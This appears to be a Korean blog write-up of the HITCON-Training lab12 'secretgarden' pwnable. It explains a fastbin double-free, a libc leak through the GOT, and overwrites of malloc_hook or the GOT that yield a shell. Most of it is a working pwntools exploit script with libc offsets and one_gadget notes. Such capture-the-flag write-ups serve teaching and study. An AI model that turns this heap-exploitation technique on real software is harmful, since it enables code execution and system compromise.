---
layout: post
title: "[HITCON-Training] lab12 : secretgarden"
comments: true
excerpt_separator: <!--more-->
tags:
  - Write-up
  - pwnable
  - MyriaBreak

---

처음에 `fastbin double free`를 이용해서 got영역을 덮으려고 했으나, chunk size로 적절한 영역을 찾지못해서... 

그냥 got영역을 이용해 libc주소를 leak한 다음, `malloc_hook`을 `magic함수` 주소로 덮었다.



그런데 알고보니... chunksize로 아래와 같은 부분을 사용할 수 있었다.

    0x601ffa:    0x1e28000000000000    0xe168000000000060
    0x60200a:    0x0000414141414141    0x2390000000000000
0x601ffa를 0x60 fastbin에 넣어서 사용할 수 있었다.

아니 근데 fastbin size가 아니지않나? `0xe168000000000060`인데? 

그래서`malloc.c`파일을 살펴보았다. 그 내용은 아래 url에...





exploit은 아래와 같이 할 수 있다.

`double free`버그로 flower데이터를 2번 할당받아서 원하는 메모리 주소를 leak할 수 있고, 그렇게 leak한 libc주소로 system함수 주소를 구해 다시 `double free`버그로 free_got를 system함수로 덮어서 쉘을 획득할 수 있다.



```python
#!/usr/bin/env python
from pwn import *

conn = process(["gdb-peda", "./secretgarden"])
conn.sendline("b *0x0400F22")
conn.sendline("r")

def raiseflower(length,name,color):
    conn.recvuntil(":")
    conn.sendline("1")
    conn.recvuntil(":")
    conn.sendline(str(length))
    conn.recvuntil(":")
    conn.send(name)
    conn.recvuntil(":")
    conn.sendline(color)

def visit():
    conn.recvuntil(":")
    conn.sendline("2")

def remove(idx):
    conn.recvuntil(":")
    conn.sendline("3")
    conn.recvuntil(":")
    conn.sendline(str(idx))

def clean():
    conn.recvuntil(":")
    conn.sendline("4")

my_exploit = False#True

if(my_exploit):
    conn.recvuntil("Baby Secret Garden")

    raiseflower(0x20, "A"*0x20, "red")
    raiseflower(0x20, "A"*0x20, "blue")

    # double free
    remove(0)
    remove(1)
    remove(0)
    clean()

    raiseflower(0x20, "A"*0x20, "green")
    raiseflower(0x60, "A"*0x60, "leak")

    # exist make 0
    remove(1)

    # leak puts_addr
    payload =  p64(1)
    payload += p64(0x602020)
    raiseflower(0x20, payload, "red")

    visit()
    conn.recvuntil("[1] :")
    puts_addr = u64(conn.recv(6).ljust(8, "\x00"))
    log.info("puts_addr : " + hex(puts_addr))
    
    # double free
    raiseflower(0x60, "A"*0x60, "A") #3
    raiseflower(0x60, "A"*0x60, "B") #4

    remove(3)
    remove(4)
    remove(3)
    clean()

    base_addr = puts_addr - 0x6f690
    one_shot = base_addr + 0x45216
    magic = 0x0400C7B 
    malloc_hook = base_addr +  0x3c4b10 - 11 - 8
    """
    0x45216 execve("/bin/sh", rsp+0x30, environ)
    constraints:
      rax == NULL

    0x4526a execve("/bin/sh", rsp+0x30, environ)
    constraints:
      [rsp+0x30] == NULL

    0xf02a4 execve("/bin/sh", rsp+0x50, environ)
    constraints:
      [rsp+0x50] == NULL

    0xf1147 execve("/bin/sh", rsp+0x70, environ)
    constraints:
      [rsp+0x70] == NULL

    """
    log.info("base_addr   : " + hex(base_addr))
    log.info("malloc_hook : " + hex(malloc_hook))
    log.info("one_shot    : " + hex(one_shot))
    log.info("magic       : " + hex(magic))

    raiseflower(0x60, p64(malloc_hook)+"\n", "A") #3
    raiseflower(0x60, "A"*0x60, "B") #4
    raiseflower(0x60, "A"*0x60, "B") #4
    raiseflower(0x60, "A"*3+p64(magic), "B")

else:
    conn.recvuntil("Baby Secret Garden")

    raiseflower(0x20, "A"*0x20, "red")
    raiseflower(0x20, "A"*0x20, "blue")

    # double free
    remove(0)
    remove(1)
    remove(0)
    clean()

    raiseflower(0x20, "A"*0x20, "green")
    raiseflower(0x60, "A"*0x60, "leak")

    # exist make 0
    remove(1)

    # leak puts_addr
    payload =  p64(1)
    payload += p64(0x602020)
    raiseflower(0x20, payload, "red")

    visit()
    conn.recvuntil("[1] :")
    puts_addr = u64(conn.recv(6).ljust(8, "\x00"))
    log.info("puts_addr : " + hex(puts_addr))

    # double free
    raiseflower(0x60, "A"*0x60, "A") #3
    raiseflower(0x60, "A"*0x60, "B") #4

    remove(3)
    remove(4)
    remove(3)
    clean()

    base_addr = puts_addr - 0x6f690
    system_addr = base_addr + 0x45390
    fake_chunk = 0x601ffa
    """
    0x601ffa:    0x1e28000000000000    0xe168000000000060
    0x60200a:    0x0000414141414141    0x2390000000000000
    """


    log.info("base_addr   : " + hex(base_addr))
    log.info("system_addr : " + hex(system_addr))
    log.info("fake_chunk  : " + hex(fake_chunk))

    raiseflower(0x60, p64(fake_chunk)+"\n", "A") #3
    raiseflower(0x60, "/bin/sh\x00"+"\n", "B") #4
    raiseflower(0x60, "A"*0x60, "B") 
    #raiseflower(0x50, "A"*6+p64(0)+p64(system_addr), "B")
    
    #remove(4)
    """
    conn.recvuntil("Baby Secret Garden")
    magic = 0x400c7b
    fake_chunk = 0x601ffa
    raiseflower(0x50,"da","red")
    raiseflower(0x50,"da","red")
    remove(0)
    remove(1)
    remove(0)
    raiseflower(0x50,p64(fake_chunk),"blue")
    raiseflower(0x50,"da","red")
    raiseflower(0x50,"da","red")
    raiseflower(0x50,"a"*6 + p64(0) + p64(magic) ,"red")
    """

conn.interactive()

```



